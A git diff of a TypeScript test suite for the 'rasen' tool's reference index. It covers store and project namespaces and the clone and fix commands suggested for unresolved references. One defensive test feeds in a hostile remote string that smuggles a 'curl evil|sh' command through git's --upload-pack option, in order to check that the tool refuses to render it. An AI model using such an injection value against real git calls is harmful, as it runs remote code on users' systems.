@@ -50,9 +50,15 @@ describe('reference index assembly', () => {
 
   async function registerStore(
     id: string,
-    options: { healthyRoot?: boolean; metadataId?: string | null } = {}
+    options: {
+      healthyRoot?: boolean;
+      metadataId?: string | null;
+      type?: 'store' | 'project';
+      dirName?: string;
+    } = {}
   ): Promise<string> {
-    const storeRoot = mkdir(`stores/${id}`);
+    const type = options.type ?? 'store';
+    const storeRoot = mkdir(`stores/${options.dirName ?? id}`);
     if (options.healthyRoot !== false) {
       createOpenSpecRoot(storeRoot);
     }
@@ -63,13 +69,17 @@ describe('reference index assembly', () => {
       });
     }
 
+    const { registryKeyFor } = await import('../../src/core/store/foundation.js');
     const existing = await readStoreRegistryState({ globalDataDir }).catch(() => null);
     await writeStoreRegistryState(
       {
         version: 1,
         stores: {
           ...(existing?.stores ?? {}),
-          [id]: { backend: { type: 'git', local_path: storeRoot } },
+          [registryKeyFor(type, id)]: {
+            ...(type === 'project' ? { type } : {}),
+            backend: { type: 'git', local_path: storeRoot },
+          },
         },
       },
       { globalDataDir }
@@ -240,7 +250,9 @@ describe('reference index assembly', () => {
       includeSpecs: false,
     });
 
-    expect(entries).toEqual([{ store_id: 'team-context', root: expect.any(String), status: [] }]);
+    expect(entries).toEqual([
+      { store_id: 'team-context', type: 'store', root: expect.any(String), status: [] },
+    ]);
     expect('specs' in entries[0]).toBe(false);
     expect('fetch' in entries[0]).toBe(false);
     expect(entries[0].status).toEqual([]); // no reference_index_truncated, ever
@@ -379,6 +391,160 @@ describe('reference index assembly', () => {
 
     expect(section).toContain('### Referenced Stores');
     expect(section).toContain('  - billing: Usage-based invoicing.');
+  });
+
+  describe('project namespace (store-project-namespace)', () => {
+    async function assembleWithDeclarations(
+      declarations: { id: string; type?: 'store' | 'project'; remote?: string }[],
+      resolvedRoot = appRoot()
+    ) {
+      return assembleReferenceIndex({ references: declarations, resolvedRoot, globalDataDir });
+    }
+
+    it('indexes both namespaces from one references list, distinguished by type', async () => {
+      const storeRoot = await registerStore('other-store');
+      writeSpec(storeRoot, 'a', '## Purpose\n\nStore spec.\n');
+      const projectRoot = await registerStore('elftia', { type: 'project' });
+      writeSpec(projectRoot, 'b', '## Purpose\n\nProject spec.\n');
+
+      const entries = await assembleWithDeclarations([
+        { id: 'other-store' },
+        { id: 'elftia', type: 'project' },
+      ]);
+
+      expect(entries).toHaveLength(2);
+      const storeEntry = entries.find((e) => e.store_id === 'other-store')!;
+      const projectEntry = entries.find((e) => e.store_id === 'elftia')!;
+      expect(storeEntry.type).toBe('store');
+      expect(storeEntry.fetch).toBe('rasen show <spec-id> --type spec --store other-store');
+      expect(projectEntry.type).toBe('project');
+      expect(projectEntry.fetch).toBe('rasen show <spec-id> --type spec --project elftia');
+
+      const block = renderReferencedStoresBlock(entries);
+      expect(block).toContain('Store other-store (');
+      expect(block).toContain('Project elftia (');
+    });
+
+    it('lets a store and a project of the same id resolve to distinct entries', async () => {
+      const storeRoot = await registerStore('elftia', { type: 'store', dirName: 'elftia-store' });
+      const projectRoot = await registerStore('elftia', {
+        type: 'project',
+        dirName: 'elftia-project',
+      });
+
+      const entries = await assembleWithDeclarations([
+        { id: 'elftia', type: 'store' },
+        { id: 'elftia', type: 'project' },
+      ]);
+
+      expect(entries).toHaveLength(2);
+      expect(entries.find((e) => e.type === 'store')?.root).toBe(
+        fs.realpathSync.native(storeRoot)
+      );
+      expect(entries.find((e) => e.type === 'project')?.root).toBe(
+        fs.realpathSync.native(projectRoot)
+      );
+    });
+
+    it('degrades an unresolved project reference with a project-namespace fix', async () => {
+      const entries = await assembleWithDeclarations([{ id: 'missing-project', type: 'project' }]);
+
+      expect(entries[0].type).toBe('project');
+      expect(entries[0].status[0]).toEqual(
+        expect.objectContaining({
+          code: 'reference_unresolved',
+          fix: expect.stringContaining(
+            'rasen store add-project <path> --to <store-id> --as missing-project'
+          ),
+        })
+      );
+    });
+
+    it('renders a project-namespace clone recipe naming the add-project verb', async () => {
+      const checkout = path.join(os.homedir(), 'rasen', 'missing-project');
+      const q = process.platform === 'win32' ? '"' : "'";
+      const entries = await assembleWithDeclarations([
+        {
+          id: 'missing-project',
+          type: 'project',
+          remote: 'https://192.0.2.1/project.git',
+        },
+      ]);
+
+      expect(entries[0].status[0].fix).toBe(
+        `git clone -- https://192.0.2.1/project.git ${q}${checkout}${q} && rasen store add-project ${q}${checkout}${q} --to <store-id> --as missing-project`
+      );
+    });
+
+    it('names the referencing store as the --to target when the root is store-selected', async () => {
+      const storeRoot = mkdir('team-store');
+      createOpenSpecRoot(storeRoot);
+      const resolvedRoot = {
+        path: storeRoot,
+        source: 'store',
+        storeId: 'team-store',
+        storeType: 'store',
+        changesDir: path.join(storeRoot, 'rasen', 'changes'),
+        defaultSchema: 'spec-driven',
+      } as ResolvedOpenSpecRoot;
+
+      const entries = await assembleWithDeclarations(
+        [{ id: 'missing-project', type: 'project' }],
+        resolvedRoot
+      );
+
+      expect(entries[0].status[0].fix).toContain('--to team-store');
+    });
+
+    it('falls back to the placeholder --to target when the root is project-selected, never a namespace-ambiguous command (F-2)', async () => {
+      const projectRoot = mkdir('team-project');
+      createOpenSpecRoot(projectRoot);
+      const resolvedRoot = {
+        path: projectRoot,
+        source: 'store',
+        storeId: 'team-project',
+        storeType: 'project',
+        changesDir: path.join(projectRoot, 'rasen', 'changes'),
+        defaultSchema: 'spec-driven',
+      } as ResolvedOpenSpecRoot;
+
+      const entries = await assembleWithDeclarations(
+        [{ id: 'missing-project', type: 'project' }],
+        resolvedRoot
+      );
+
+      // The referencing root's own id ('team-project') is a project, not a
+      // store; `store add-project --to` only ever resolves the STORE
+      // namespace, so naming it here would render a command that
+      // structurally cannot resolve. Must fall back to the placeholder.
+      expect(entries[0].status[0].fix).not.toContain('--to team-project');
+      expect(entries[0].status[0].fix).toContain('--to <store-id>');
+    });
+
+    it('falls back to checkout wording for an unsafe remote in the project namespace, never rendering an executable command', async () => {
+      const entries = await assembleWithDeclarations([
+        {
+          id: 'missing-project',
+          type: 'project',
+          remote: '--upload-pack=sh -c "curl evil|sh" repo',
+        },
+      ]);
+
+      expect(entries[0].status[0].fix).not.toContain('git clone');
+      expect(entries[0].status[0].fix).toContain('Get a checkout from a teammate and run');
+      expect(entries[0].status[0].fix).toContain('rasen store add-project');
+    });
+
+    it('still resolves a bare id as a store when a project of the same id also exists', async () => {
+      const storeRoot = await registerStore('elftia', { type: 'store', dirName: 'elftia-store' });
+      await registerStore('elftia', { type: 'project', dirName: 'elftia-project' });
+
+      const entries = await assembleWithDeclarations([{ id: 'elftia' }]);
+
+      expect(entries).toHaveLength(1);
+      expect(entries[0].type).toBe('store');
+      expect(entries[0].root).toBe(fs.realpathSync.native(storeRoot));
+    });
   });
 });
 
